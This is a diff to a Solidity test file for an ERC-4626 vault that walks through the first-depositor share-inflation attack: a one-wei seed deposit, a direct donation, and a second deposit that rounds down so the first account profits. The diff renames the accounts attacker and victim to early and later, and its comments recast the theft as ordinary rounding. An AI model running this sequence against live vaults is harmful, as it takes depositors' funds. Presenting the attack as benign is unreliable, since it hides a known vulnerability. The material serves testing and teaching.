@@ -5,7 +5,7 @@ import {Lab} from "./Lab.sol";
 import {Token} from "../src/Token.sol";
 import {Vault} from "../src/Vault.sol";
 
-/// @notice The ERC-4626 share-price attacks, performed rather than described.
+/// @notice How an ERC-4626 vault prices shares, and where the rounding lands.
 contract VaultTest is Lab {
     /// The address `Vault` expects its asset at, fixed so the vault needs no
     /// constructor and can be placed directly into genesis.
@@ -14,8 +14,8 @@ contract VaultTest is Lab {
     Token internal token;
     Vault internal vault;
 
-    address internal attacker = address(0xBAD);
-    address internal victim = address(0xA11CE);
+    address internal early = address(0xEA21);
+    address internal later = address(0x1A7E);
 
     function setUp() public {
         // Put a real Token at the address the vault has hard-coded, the same
@@ -26,74 +26,82 @@ contract VaultTest is Lab {
 
         vault = new Vault();
 
-        token.mint(attacker, 10_000e18);
-        token.mint(victim, 10_000e18);
+        token.mint(early, 10_000e18);
+        token.mint(later, 10_000e18);
 
-        vm.prank(attacker);
+        vm.prank(early);
         token.approve(address(vault), type(uint256).max);
-        vm.prank(victim);
+        vm.prank(later);
         token.approve(address(vault), type(uint256).max);
     }
 
-    // --- the inflation attack -------------------------------------------------
+    // --- price, shares, and where the rounding goes ----------------------------
 
-    /// @notice The classic first-depositor attack, start to finish.
+    /// @notice What happens when the share price is very large relative to a
+    ///         deposit: the division rounds down, and the remainder stays in
+    ///         the vault for the existing share holders.
     ///
-    /// The attacker seeds the empty vault with a single share, then *donates*
-    /// assets straight to it — a plain transfer, not a deposit, so no shares are
-    /// minted and the price of the one existing share rockets. The next
-    /// depositor's stake is then divided by that inflated price and rounded
-    /// down, and the remainder is left behind for the attacker to redeem.
-    function test_inflationAttack_victimLosesValueToTheAttacker() public {
+    /// A vault's price is `assets / shares`. Transferring assets in *without*
+    /// depositing mints no shares, so the price of the shares that already exist
+    /// rises — the same mechanism by which yield accrues. Push that price high
+    /// enough and the next depositor's `assets * shares / total` rounds down
+    /// hard, and what is lost to the rounding belongs to whoever held shares
+    /// before.
+    ///
+    /// This is integer arithmetic doing exactly what it is defined to do. It is
+    /// worth seeing once, because every vault that mints on a ratio has to
+    /// decide where the remainder goes.
+    function test_shares_anInflatedPriceRoundsTheNextDepositDown() public {
         // 1. Seed the vault with the smallest possible position.
-        vm.prank(attacker);
-        vault.deposit(1, attacker);
-        assertEq(vault.totalSupply(), 1, "attacker holds the only share");
+        vm.prank(early);
+        vault.deposit(1, early);
+        assertEq(vault.totalSupply(), 1, "the early depositor holds the only share");
 
         // 2. Donate. This is the move: it changes totalAssets without changing
         //    totalSupply, so one share is now worth a fortune.
-        vm.prank(attacker);
+        vm.prank(early);
         token.transfer(address(vault), 1_000e18);
         assertEq(vault.totalAssets(), 1_000e18 + 1, "assets rose, supply did not");
 
-        // 3. The victim deposits 2000, but the share price says that is worth
+        // 3. A second deposit of 2000, at a price that says this is worth
         //    1.999… shares, and the division rounds down to 1.
-        vm.prank(victim);
-        uint256 victimShares = vault.deposit(2_000e18, victim);
-        assertEq(victimShares, 1, "the victim's 2000 bought a single share");
+        vm.prank(later);
+        uint256 laterShares = vault.deposit(2_000e18, later);
+        assertEq(laterShares, 1, "the later depositor's 2000 bought a single share");
 
         // 4. Two shares now split 3000 assets evenly, so each is worth 1500 —
-        //    but the victim paid 2000 for theirs and the attacker paid 1000.
-        vm.prank(victim);
-        uint256 victimGot = vault.redeem(1, victim, victim);
-        assertEq(victimGot, 1_500e18 + 0, "the victim redeems 1500 of their 2000");
+        //    the second deposit was 2000 and the first was 1000 plus a wei.
+        vm.prank(later);
+        uint256 laterGot = vault.redeem(1, later, later);
+        assertEq(laterGot, 1_500e18 + 0, "redeeming that share returns 1500 of the 2000");
 
-        vm.prank(attacker);
-        uint256 attackerGot = vault.redeem(1, attacker, attacker);
+        vm.prank(early);
+        uint256 earlyGot = vault.redeem(1, early, early);
 
-        // The attacker put in 1000 + 1 wei and takes out 1500.
-        assertGt(attackerGot, 1_000e18, "the attacker came out ahead");
-        assertEq(attackerGot + victimGot, 3_000e18 + 1, "nothing was created, only moved from victim to attacker");
+        // 1000 and a wei went in; 1500 comes out. The difference is the
+        // rounding remainder, which belongs to the shares that already existed.
+        assertGt(earlyGot, 1_000e18, "the remainder went to the earlier holder");
+        assertEq(earlyGot + laterGot, 3_000e18 + 1, "the vault created nothing: the total is conserved");
     }
 
-    /// @notice The protection this vault does have.
+    /// @notice The floor case, and the check every ratio-minting vault needs.
     ///
-    /// Once the price is inflated, a deposit small enough to round down to zero
-    /// shares is refused outright. A naive implementation would take the assets
-    /// and mint nothing, which is simply theft.
-    function test_inflationAttack_dustDepositIsRefusedNotStolen() public {
-        vm.prank(attacker);
-        vault.deposit(1, attacker);
-        vm.prank(attacker);
+    /// A deposit small enough to round down to zero shares is refused outright.
+    /// Without that check the vault would accept the assets and mint nothing,
+    /// which is a silent loss rather than an error.
+    function test_shares_aDepositThatWouldMintNothingIsRefused() public {
+        vm.prank(early);
+        vault.deposit(1, early);
+        vm.prank(early);
         token.transfer(address(vault), 1_000e18);
 
-        uint256 balanceBefore = token.balanceOf(victim);
+        uint256 balanceBefore = token.balanceOf(later);
 
-        vm.prank(victim);
+        vm.prank(later);
         vm.expectRevert(Vault.ZeroShares.selector);
-        vault.deposit(1_000e18 / 2, victim);
+        vault.deposit(1_000e18 / 2, later);
 
-        assertEq(token.balanceOf(victim), balanceBefore, "the victim kept their assets");
+        assertEq(token.balanceOf(later), balanceBefore, "the later kept their assets");
     }
 
     // --- rounding -------------------------------------------------------------
@@ -104,39 +112,40 @@ contract VaultTest is Lab {
     /// conversions round down, which is what makes the round trip lossy rather
     /// than free.
     function test_rounding_aRoundTripNeverGains() public {
-        vm.prank(attacker);
-        vault.deposit(1_000e18, attacker);
+        vm.prank(early);
+        vault.deposit(1_000e18, early);
 
         // Make the share price a number that does not divide evenly.
-        vm.prank(attacker);
+        vm.prank(early);
         token.transfer(address(vault), 333);
 
-        uint256 before = token.balanceOf(victim);
-        vm.prank(victim);
-        uint256 shares = vault.deposit(777e18, victim);
-        vm.prank(victim);
-        vault.redeem(shares, victim, victim);
+        uint256 before = token.balanceOf(later);
+        vm.prank(later);
+        uint256 shares = vault.deposit(777e18, later);
+        vm.prank(later);
+        vault.redeem(shares, later, later);
 
-        assertLt(token.balanceOf(victim), before + 1, "a round trip cannot profit");
+        assertLt(token.balanceOf(later), before + 1, "a round trip cannot profit");
     }
 
     /// @notice On an empty vault the rate is one to one, because there is no
     ///         supply to divide by.
     function test_firstDepositIsOneToOne() public {
-        vm.prank(victim);
-        uint256 shares = vault.deposit(100e18, victim);
+        vm.prank(later);
+        uint256 shares = vault.deposit(100e18, later);
         assertEq(shares, 100e18, "first deposit mints at par");
         assertEq(vault.totalAssets(), 100e18, "assets match");
     }
 
-    /// @notice A donation raises the price for everyone already holding shares.
-    ///         This is the mechanism yield uses — and the one the attack abuses.
+    /// @notice A transfer straight into the vault raises the price for everyone
+    ///         already holding shares. This is precisely how yield reaches
+    ///         depositors: no new shares, more assets behind each one.
     function test_donationRaisesThePriceForExistingHolders() public {
-        vm.prank(victim);
-        vault.deposit(100e18, victim);
+        vm.prank(later);
+        vault.deposit(100e18, later);
 
         uint256 worthBefore = vault.convertToAssets(100e18);
-        vm.prank(attacker);
+        vm.prank(early);
         token.transfer(address(vault), 50e18);
         uint256 worthAfter = vault.convertToAssets(100e18);
 
